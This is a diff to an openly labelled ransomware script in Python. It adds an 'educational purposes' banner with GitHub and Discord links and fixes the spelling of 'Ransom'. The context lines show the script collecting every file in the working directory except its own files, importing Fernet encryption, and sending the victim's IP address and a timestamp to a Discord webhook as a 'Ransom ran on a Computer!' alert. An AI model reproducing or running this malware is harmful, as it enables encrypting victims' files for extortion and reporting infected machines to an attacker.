@@ -1,4 +1,13 @@
 #!usr/bin/env python3
+
+######################################################
+# Copy Right to ~> Security On PePs & Team           #
+# Follow Me on Github ~> https://github.com/ajdev05/ #
+# Discord ~> https://discord.gg/KBSQyjWVzG           #
+# *Only for testing and educational Purposes*        #
+######################################################
+
+
 import os
 from cryptography.fernet import Fernet
 import time
@@ -9,7 +18,7 @@ os.system("clear")
 files=[]
 
 for file in os.listdir():
-    if file == 'en.py'or file == "enkey.key" or file == "dc.py" or file == "decrypt.txt":
+    if file == 'en.py'or file == "enkey.key" or file == "dc.py" or file == "decrypt.txt": ### Main Files that are Going to be created change them if you like.
         continue
     if os.path.isfile(file):
             files.append(file)
@@ -22,10 +31,10 @@ nowt=dt.strftime("%Y-%m-%d %H:%M:%S")
 
 url = "YOUR DISCORD WEBHOOK GOES HERE"
 x = f"""```
-Ransome ran on a Computer! 
----------------------------
+Ransom ran on a Computer! 
+--------------------------
 Target IP Address ~> {ip} 
------------------------------------
+---------------------------------
 Time ~> {nowt}```"""
 
 r=requests.post(url, data={"content": x})
